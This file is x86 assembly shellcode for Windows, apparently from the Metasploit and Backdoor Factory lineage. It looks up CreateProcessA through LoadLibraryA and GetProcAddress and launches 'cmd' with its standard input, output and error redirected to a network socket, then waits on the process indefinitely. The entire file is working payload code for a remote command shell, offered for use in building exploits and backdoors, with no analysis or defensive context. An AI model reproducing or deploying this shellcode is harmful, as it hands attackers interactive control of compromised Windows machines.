;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
; Updated by Joshua Pitts (5/30/2014) for loadliba shellcode dev
;-----------------------------------------------------------------------------;
[BITS 32]

; Output: None.
; Clobbers: EAX, EBX, ECX, ESI, ESP will also be modified
; Calling getprocaddress and loadlibraryA smashes the following regs: EAX, ECX, EDX, ESP
; Coming in LoadLibA is in EBX and GetprocessAddress is in ESI
; socket is in EDI coming in

;Do a loadlibA of kernel32
;then getprocessaddress of 'CreateProcessA'
  push 0x0
  push 0x32336c65         ; Push kernel32 on the stack
  push 0x6e72656b         ; ...
  push esp                ; Push a pointer to the "kernel32" string on the stack.
  call dword [ebx]        ; handle for kernel32 now in eax

  push 0x00004173         ; Push CreateProcessA on the stack
  push 0x7365636f         ; ...
  push 0x72506574         ; ...
  push 0x61657243         ; ...
  push esp                ; Push a pointer to CreateProcessA string on the stack
  push eax                ; Push handle for kernel32 on the stack
  call dword [esi]        ; Call getprocessaddress | CreateProcessA address in EAX

  xchg ebp, eax           ; Put createprocessa in ebp

; loadlibA EBX, GetprocAddr ESI, CreateProcessA in EBP, socket handle in EDI
; SHELLGAME TIME!!!
; in this block the following are clobbered ebx,
; Not clobbered ebp, eax, esi

 xchg eax, ebx           ; xchg loadlibA to eax

shell:
  push 0x00646D63        ; push our command line: 'cmd',0
  mov ebx, esp           ; save a pointer to the command line
  push edi               ; our socket becomes the shells hStdError
  push edi               ; our socket becomes the shells hStdOutput
  push edi               ; our socket becomes the shells hStdInput

; loadLibA EAX, getprocaddr esi, createprocessA ebp
; This block clobbered: ecx, esi
; Not clobbered, edx ebp, ebx, edi,

  xchg edi, esi          ; xchg (move) getprocaddr to edi
  xchg edx, eax          ; xchg (move) loadlibA to edx
  xor esi, esi           ; Clear ESI for all the NULL's we need to push
  push byte 18           ; We want to place (18 * 4) = 72 null bytes onto the stack
  pop ecx                ; Set ECX for the loop

; loadLibA edx, getprocaddr edi, createprocessA ebp
; in this block the following are clobbered esi, eax, ecx, esp (loop)
;unclobbered edx, ebp, edi, ebx

push_loop:               ;
  push esi               ; push a null dword
  loop push_loop         ; keep looping untill we have pushed enough nulls
  mov word [esp + 60], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  lea eax, [esp + 16]    ; Set EAX as a pointer to our STARTUPINFO Structure
  mov byte [eax], 68     ; Set the size of the STARTUPINFO Structure
  
; loadLibA edx, getprocaddr edi, createprocessA ebp
; in this block the following are clobbered esi, eax, esp (loop), ebx
; unclobbered edx, ebp, edi, ecx
; Calling getprocaddress and loadlibraryA smashes the following regs: EAX, ECX, EDX, ESP
; perform the call to CreateProcessA
  push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
  push eax               ; Push the pointer to the STARTUPINFO Structure
  push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
  push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
  push esi               ; We dont specify any dwCreationFlags 
  inc esi                ; Increment ESI to be one
  push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
  dec esi                ; Decrement ESI back down to zero
  push esi               ; Set lpThreadAttributes to NULL
  push esi               ; Set lpProcessAttributes to NULL
  push ebx               ; Set the lpCommandLine to point to "cmd",0
  push esi               ; Set lpApplicationName to NULL as we are using the command line param instead
  xchg ebx, edx          ; xchg (move) LoadLibA to ebx 
  call ebp               ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
  mov esi, esp           ; save pointer to the PROCESS_INFORMATION Structure 
  
  ;loadLiba ebx, getprocaddr edi, PROCESS_INFORMATION Structure esi

  ; need kernel32 again :/
  push 0x0
  push 0x32336c65         ; Push kernel32 on the stack
  push 0x6e72656b         ; ...
  push esp                ; Push a pointer to the "kernel32" string on the stack.
  call dword [ebx]        ; handle for kernel32 now in eax
  
  ;loadLiba ebx, getprocaddr edi, PROCESS_INFORMATION Structure esi, kernel32 eax
  ; getprocessaddress of 'WaitForSingleObject'
  push 0x00746365         ; Push WaitForSingleObject
  push 0x6a624f65         ; ...
  push 0x6c676e69         ; ...
  push 0x53726f46         ; ...  
  push 0x74696157         ; ...
  push esp                ; Push pointer for WaitForSingleObject
  push eax                ; Push handle for kernel32
  xchg eax, ebp           ; mov kernel32 to ebp
  call dword [edi]        ; GetprocessAddress (kernel32, WaitForSingleObject)
  xchg ebp, eax           ; Push waitforsingleobject address in ebp and kernel32 to eax
  
  ;loadLiba ebx, getprocaddr edi, PROCESS_INFORMATION Structure esi, kernel32 eax, waitforsingleobject ebp
  ; perform the call to WaitForSingleObject
  mov edx, esi           ; mov PROCESS_INFORMATION Structure to edx
  xor esi, esi           ; zero out esi
  dec esi                ; Decrement ESI down to -1 (INFINITE)
  push esi               ; push INFINITE inorder to wait forever  ; you can NOP this out for BDF
  ;nop
  inc esi                ; Increment ESI back to zero
  mov esp, edx 
  push dword [edx]       ; push the handle from our PROCESS_INFORMATION.hProcess
  xchg eax, esi          ; mov kernel32 to esi for safety
  call ebp               ; WaitForSingleObject( pi.hProcess, INFINITE );
;loadLiba ebx, getprocaddr edi, kernel32 esi
  add esp, 0x0234          ; Realign Stack
